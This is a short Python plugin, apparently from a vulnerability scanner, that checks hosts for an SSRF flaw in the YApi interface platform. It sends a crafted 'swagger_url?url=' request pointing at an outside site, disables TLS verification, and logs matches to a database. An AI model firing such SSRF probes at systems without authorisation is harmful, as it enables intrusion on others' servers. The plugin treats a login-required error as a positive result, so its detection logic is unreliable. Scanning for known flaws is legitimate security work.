import requests

from celery_app.utils.utils import insert_vuln_db

#YApi 接口管理平台 SSRF 漏洞
plugin_id=60
default_port_list=[80,443,8080,8000,3000]


def check(host, port=80):
    scheme = 'https' if '443' in str(port) else 'http'
    target = '{}://{}:{}'.format(scheme, host, port)
    uris = ['/api/project/swagger_url?url=http://www.baidu.com']
    try:
        targets = ['{}{}'.format(target, uri) for uri in uris]
        requests.packages.urllib3.disable_warnings()
        with requests.Session() as session:
            for target in targets:
                response = session.get(target, timeout=7, verify=False)
                if '{"errcode":40011,"errmsg":"请登录...","data":null}' in response.text:
                    output = response.text
                    insert_vuln_db(host, target, output, plugin_id)
                    return True, host, target, output
    except Exception as error:
        return False
    return False